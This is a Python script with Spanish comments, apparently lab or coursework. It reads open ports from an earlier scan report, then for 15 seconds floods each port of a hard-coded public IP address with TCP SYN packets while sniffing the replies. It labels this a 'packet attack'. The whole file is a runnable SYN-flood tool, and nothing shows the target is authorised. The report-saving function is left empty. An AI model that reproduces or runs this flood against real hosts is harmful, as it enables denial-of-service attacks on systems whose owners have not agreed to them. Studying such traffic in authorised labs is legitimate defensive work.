from datetime import datetime
from scapy.all import IP, TCP, Raw, sniff, send, RandInt
from threading import Thread

import os
import re
import time


HOST = "74.179.81.132"
ruta_actual = os.getcwd()
ruta_reporte_scan = os.path.join(ruta_actual, "ultimo_reporte_scan.txt")

def validar_puertos_abiertos(ruta_reporte):
    """
    Lee el reporte (txt) generado por scanner.py y obtiene la lista de puertos abiertos
    Retorna:
        puertos_abiertos = Lista de puertos abiertos
    """
    puertos_abiertos = []

    try:
        # Lee el archivo, y extrae unicamente el numero de puerto
        with open(ruta_reporte, "r", encoding="utf-8") as f:
            for l in f:
                linea = l.strip()
                m = re.search(r"Puerto\s+(\d+):\s+open", linea, re.IGNORECASE)
                if m:
                    # Agrega cada numero a la lista de puertos
                    puertos_abiertos.append(int(m.group(1)))
    except FileNotFoundError:
        print(f"[!] Archivo {ruta_reporte} no encontrado.")
    except Exception as e:
        print(f"[!] Error leyendo {ruta_reporte}: {e}")

    return puertos_abiertos


def procesar_paquete(paquete, trafico_sniffer):
    """
    Procesa un paquete capturado como un dict y lo agregra a una lista de eventos.
    Arg:
        paquete: Paquete capturado por el Sniffer
        trafico_sniffer: Lista de trafico capturado en el sniffer
    """
    # Almacena todos los datos que se capturan en el sniffer
    try:
        datos_paquete = {
            "summary": paquete.summary(),
            "datos": paquete.show(dump=True)
        }

        # Agrega el paquete a la lista de eventos
        trafico_sniffer.append(datos_paquete)

    except Exception as e:
        print(f"[!] Error procesando el paquete: {e}")


def sniffer_de_trafico(trafico_sniffer):
    """
    Captura de tráfico entre equipo local y el host durante XX segundos
        variable timeout = XX segundos
    Arg:
        trafico_sniffer: Lista donde se almacena el trafico capturado
    """
    filtro_bpf = f"host {HOST}"

    try:
        sniff(
            filter=filtro_bpf,
            iface="wlan0",
            prn=lambda paquete: procesar_paquete(paquete, trafico_sniffer),
            timeout=20
        )

    except Exception as e:
        print(f"[!] Error en sniffer: {e}")


def envio_TCP(puertos_dest):
    """
    Envía una cantidad definida de paquetes a los puertos abiertos del host
    Arg:
        puertos_dest: Lista de puertos abiertos, obtenida del reporte de scanner.py
    Retorna:
        Reporte de paquetes enviados 
    """

    # Dict = cada puerto con una lista de trafico enviado
    reporte_puertos = {p: [] for p in puertos_dest}
    ip = IP(dst = HOST)
    tiempo_envio = 15

    inicio = time.time()
    cant_paquetes = 0

    while time.time() - inicio < tiempo_envio:
        cant_paquetes += 1
        # Envia un paquete a cada puerto abierto
        for puerto in puertos_dest:
            try:
                tcp = TCP(dport=puerto, seq=RandInt(),  flags="S")
                packet = ip/tcp # Arma el paquete a enviar
                packet = packet.__class__(bytes(packet))

                try:
                    send(packet, verbose=0) # Envía el paquete
                except Exception as e:
                    print(f"[!] Error enviando paquete al puerto {puerto}: {e}")

                print(f"Enviando paquete SYN a {HOST}, {puerto}/tcp\n")

                reporte_puertos[puerto].append({
                    "numero" : cant_paquetes,
                    "tamaño" : len(packet),
                    "ip_o" : packet[IP].src,
                    "ip_d" : packet[IP].dst,
                    "puerto_o" : packet[TCP].dport,
                    "flag" : packet[TCP].flags,
                    "seq" : packet[TCP].seq,
                    "time" : datetime.now()
                    })
            
            except Exception as e:
                print(f"[!] Error armando el paquete para el puerto {puerto}: {e}")

    return reporte_puertos


def ejecutar_packet_attack(puertos):
    """
    Lanza el sniffer en un thread (daemon) y envía SYN en el thread principal.
    Arg:
        puertos: Lista de puertos abiertos
    Retorna:
        reporte_syn = Datos recolectados al ejecutar el envío de trafico SYN
        trafico_generado = Lista de eventos encontrados
    """
    
    trafico_generado = []

    try:
        # Prepara la funcion de sniffer para ejecutarse como daemon
        hilo = Thread(target=sniffer_de_trafico, args=(trafico_generado,), daemon=True)
        hilo.start() # Inicia el hilo (daemon)

        reporte_syn = envio_TCP(puertos) # Inicia el envio de trafico

        hilo.join()  # espera a que el sniffer termine por timeout

        return reporte_syn, trafico_generado
    
    except Exception as e:
        print(f"[!] Error en ejecutando packet_attack: {e}")


def obtener_fecha_hora():
    """
    Devuelve la fecha y hora actual con formato YYYY-MM-DD_HH-MM-SS.
    """
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def guardar_reporte(data_puertos, path_reporte_scan):
    """
    Guarda en un archivo .txt el resultado del envio de paquetes
    """
    #nuev = f"{nombre_base}_{timestamp}.txt"



if __name__ == "__main__":
    # 1) Se Obtiene la lista de los puertos abiertos
    puertos = validar_puertos_abiertos(ruta_reporte_scan)
    print("Puertos abiertos:", puertos)
    # 2) Se inicia el packet_attack
    reporte_syn, eventos_sniff = ejecutar_packet_attack(puertos)
    print(f"[+] Eventos sniff capturados: {len(eventos_sniff)}")

    #text = envio_TCP(host, puertos)
    for puerto, resp in reporte_syn.items():
        print(f"REPORTE DE PUERTO: {puerto}")
        for info in resp:
            print(f"Paquete #{info['numero']}",
                  f"| size={info['tamaño']}",
                  f"| hora={info['time']}",
                  f"| ip_origen={info['ip_o']}",
                  f"| ip_destino={info['ip_d']}",
                  f"| puerto_origen={info['puerto_o']}",
                  f"| flag={info['flag']}",
                  f"| seq={info['seq']}")
        print("-" * 40)

    print("\n==== EVENTOS CAPTURADOS POR EL SNIFFER ====")
    for ev in eventos_sniff:
        print(ev["summary"])
    print("-" * 40)
